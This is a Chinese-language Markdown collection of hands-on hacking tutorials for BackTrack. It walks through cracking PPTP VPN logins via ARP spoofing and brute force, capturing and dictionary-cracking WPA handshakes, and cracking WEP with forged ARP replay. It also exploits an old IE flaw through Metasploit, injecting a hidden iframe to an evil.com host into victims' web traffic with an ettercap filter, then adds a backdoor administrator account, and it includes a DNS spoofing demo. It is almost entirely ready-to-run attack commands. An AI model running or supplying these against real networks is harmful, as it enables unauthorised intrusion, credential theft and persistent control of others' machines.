## 目录
* [一、backtrack实践教程--破解VPN](#一、backtrack实践教程--破解VPN)  
* [二、CrackWPA破解_WPA实战教程](#二、CrackWPA破解_WPA实战教程)  
* [三、crackWEP实战课程](#三、crackWEP实战课程) 
* [四、msf上最新ie漏洞的利用](#四、msf上最新ie漏洞的利用) 



***
### 一、backtrack实践教程--破解VPN
`[参考网站](http://blog.g0tmi1k.com/2010/03/chap2asleappy-v011-vpn/)`|[参考网站](http://blog.g0tmi1k.com/2010/03/chap2asleappy-v011-vpn/ "参考网站")|
```
    echo 1 > /proc/sys/net/ipv4/ip_forward
    ./arpspoof -i eth0 -t 10.0.0.3 10.0.0.9
    ./arpspoof -i eth0 -t 10.0.0.9 10.0.0.3
    注：两个shell窗口输入arpspoof
    wireshark -i eth0 -k
    注：wireshark过滤条件：chap；启动VPN
    python chap2asleap.py -u [用户名] -c [PPP_CHAP_Challenge] -r [PPP_CHAP_Response] -x -v 
    注：通过wireshark查看输入参数

    cd /pentest/passwords/wordlists/
    cat darkc0de.lst | thc-pptp-bruter -u [用户名] -n 99 -l 999 10.0.0.3
```
### 二、CrackWPA破解_WPA实战教程
```
    airmon-ng start wlan0
    注：结果中记录monitor mode的名字（如：mon7）
    airodump-ng mon7  
    注：抓取目标主机连接无线的相关信息
    airodump-ng --channel 8 --write [文件名] --bssid [无线路由器MAC] mon7
    注：抓包记录被攻击主机的连接
    aireplay-ng --deauth 1 -a [无线路由器MAC] -c [被攻击主机MAC] mon7
    注：断开被攻击主机和无线路由连接，使其再连接，被airodump抓包
    aircrack-ng [文件名] -w /pentest/passwords/wordlists/darkc0de.lst
    注：使用字典破解抓包中的密码
```
### 三、crackWEP实战课程
```
    ifconfig -a
    airmon-ng start wlan0 6
    注：其中6为channel，结果中记录monitor mode的名字（如：mon4）
    airodump-ng --ivs -w pack -c 6 mon4  
    注：抓取无线路由器上产生连接的相关信息，生成pack文件名
    aireplay-ng -1 0 -e [无线路由器节点名] -a [无线路由器MAC] -h [攻击主机MAC] mon4
    注：攻击主机伪装连接AP
    aireplay-ng -5 -b [无线路由器节点名] -h [攻击主机MAC] mon4
    注：获得1500字节PRGA（假的随机生成运算），生成xor文件
    packetforge-ng -0 -a [无线路由器MAC] -h [攻击主机MAC] -k 255.255.255.255 -l 255.255.255.255 -y [xor文件名] -w mrarp
    注：生成伪装的arp包，文件名为mrarp
    aireplay-ng -2 -r mrarp -x 512 mon4
    注：使用mrarp包，回放攻击无线路由器
    aircrack-ng -n 64 -b [无线路由器MAC] [airodum-ng生成的ivs文件]
    注：通过ivs抓包，找回密码
```
### 四、msf上最新ie漏洞的利用
MS09-002 exploit(IE7)Exposed Owning LAN for Pentesters
目标：Windows XP SP0-SP3/IE 6.0 SP0-2 & IE 7.0
```
    msfconsole

    use exploit/windows/browser/ie_iepeers_pointer
    set SRVHOST 192.168.1.103
    注：攻击者IP
    set payload windows/shell/bind_tcp
    exploit
    注：记录生成的http地址
```
```
    vi ieexp.filter

    if(ip.proto==TCP && tcp.dst==80){
        if(search(DATA.data,"Accept-Encoding")){
            replace("Accept-Encoding","Accept-Mousecat");
            msg("zapped Accept-Encoding!\n");
        }
    }
    if(ip.proto==TCP && tcp.src==80){
        if(search(DATA.data,"<body>"){
            replace("<body>","<body><iframe src=\"http://evil.com/evil.html\" width=0 height=0>");
            msg("Filter Run...&&Exploit Code Injected OK!\n");
        }
    }
    注：替换此处http地址为exploit中得到的地址

    etterfilter -o ieexpft ieexp.filter
    ettercap -T -q -F /usr/share/ettercap/ieexpft -M arp:remote /192.168.1.105/ //
    -T：使用TEXT模式启动
    -q：启动安静模式
    -F：加载指定的filter
    -M：指定使用ARP模块
    -P：加载指定的插件
    注：此处为目标主机IP，对目标主机进行arp欺骗
```
目标主机登录IE，随便输入网址，攻击主机向目标主机发送一个木马，获得shell
```
    net user
    注：列出所有用户
    net user linux520 c4rp3nt3r /add
    注：添加用户
    net localgroup administrators linux520 /add
    注：添加用户组
```
* dns spoof演示
192.168.1.101搭建web服务器（使用的google页面）
```
    vi /usr/share/ettercap/etter.dns

    #www.baidu.com  A   192.168.1.101 
    注：#去掉注释

    ettercap -T -q -P dns_spoof -M arp:remote /192.168.1.105/ //
```
目标主机访问www.baidu.com网页将显示192.168.1.101搭建的web页面
